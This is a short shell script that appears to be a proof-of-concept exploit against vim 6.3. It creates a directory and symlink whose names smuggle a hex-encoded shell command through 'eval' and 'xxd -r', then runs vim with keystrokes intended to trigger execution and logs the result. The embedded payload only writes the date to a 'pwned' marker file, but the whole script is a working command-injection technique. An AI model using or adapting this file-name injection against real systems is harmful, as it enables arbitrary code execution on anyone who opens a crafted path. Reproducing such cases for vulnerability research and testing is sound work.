#!/bin/sh

rm -rf sploit;
rm -f "pwned";
rm -f exploit;
mkdir -p "sploit/"foo"%;eval eval \`echo 0:64617465203e3e2070776e6564 | xxd -r\`;'"bar""/target;
ln -s -- "sploit/"foo"%;eval eval \`echo 0:64617465203e3e2070776e6564 | xxd -r\`;'"bar"" exploit;
touch "sploit/"foo"%;eval eval \`echo 0:64617465203e3e2070776e6564 | xxd -r\`;'"bar""/foobar;
rm -f "pwned";
PWD=`pwd`;
PROCESS=$PWD"/../src/vim63/src/vim";
#$PROCESS '+:norm jjmtjmfmc' +:q -- "sploit/"foo"%;eval eval \`echo 0:64617465203e3e2070776e6564 | xxd -r\`;'"bar""
$PROCESS '+:norm jjmtjmfmc' +:q -- "sploit/"foo"%;eval eval \`echo 0:64617465203e3e2070776e6564 | xxd -r\`;'"bar"" 2>&1 | tee overflow.log;

